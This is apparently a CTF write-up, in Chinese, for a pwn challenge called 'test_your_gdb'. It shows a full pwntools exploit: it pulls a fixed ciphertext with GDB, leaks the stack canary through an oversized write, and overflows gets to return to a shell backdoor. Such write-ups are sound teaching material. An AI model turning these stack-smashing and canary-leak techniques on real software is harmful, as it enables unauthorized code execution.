# test_your_gdb

## 题目简述

程序在子线程中加密一段固定数据，再用 `memcmp` 将用户输入与密文比较。比较成功后存在 `gets` 栈溢出，同时程序会提前泄露栈内容；利用目标是通过 GDB 取得稳定密文、从泄露中恢复 canary，最后返回到程序自带的 `execv("/bin/sh", NULL)` 后门函数。

## 解题过程

附件包含目标 ELF、加载器、`libc-2.31.so` 和 `libpthread-2.31.so`。`checksec` 显示程序启用了 Canary 与 NX，但没有启用 PIE，因此目标程序中的函数地址固定。

`main` 使用 `pthread_create` 启动 `work`。该函数的关键逻辑可以整理为：

```c
SEED_KeySchedKey(key_schedule, key);
SEED_Encrypt(ciphertext, key_schedule);
read(0, password, 0x10);

if (!memcmp(password, ciphertext, 0x10)) {
    write(1, leak_buffer, 0x100);
    gets(leak_buffer);
}
```

没有必要逆向整个 SEED 实现。用 GDB 在 `memcmp` 调用前的 `0x40138b` 下断点，随便输入 16 字节后观察第二个参数。x86-64 System V 调用约定中，`memcmp(s1, s2, n)` 的参数依次位于 `rdi`、`rsi`、`rdx`；读取 `rsi` 指向的 16 字节并多次运行，确认密文保持不变：

```text
47 f1 94 82 0e 1e 36 b0 a9 a6 d8 4e c3 e0 09 8c
```

按两个小端 64 位整数发送时，对应：

```python
password = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
```

进入成功分支后，`write` 从局部缓冲区起始位置输出 `0x100` 字节。缓冲区到 canary 的距离为 `0x18`，因此丢弃前 `0x18` 字节后读取 8 字节即可恢复本次运行的 canary。随后覆盖保存的返回地址，跳到固定地址 `0x401256` 的后门函数：

```python
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

context.arch = "amd64"
io = remote("challenge.example", 10000)

# 若当前实例启用了 PoW，先完成四字符 SHA-256 验证。
io.recvuntil(b"== ")
target = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == target,
    string.printable,
    length=4,
    method="fixed",
)
io.sendlineafter(b"> ", proof.encode())

password = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9)
io.sendafter(b"word\n", password)

io.recvn(0x18)
canary = u64(io.recvn(8))

payload = flat(
    b"A" * 0x18,
    canary,
    0,          # saved rbp
    0x401256,   # execv("/bin/sh", NULL)
)
io.sendline(payload)
io.interactive()
```

调试多线程程序时，可用 `info threads` 查看线程列表，再用 `thread <编号>` 切换到实际执行 `work` 的线程。不同部署是否包含 PoW 以及提示文本可能不同，脚本的连接和同步部分应以当前实例为准，漏洞偏移与利用链保持不变。

## 方法总结

这道题把 GDB 多线程调试、函数调用约定、canary 泄露和 ret2text 串在一起。固定密文可以在比较点动态提取，不必硬啃复杂加密算法；`write` 越界泄露解决 canary，未启用 PIE 则让后门函数地址可以直接使用。调试时必须确认当前线程和断点位置，否则很容易停在主线程而看不到真正的比较参数。
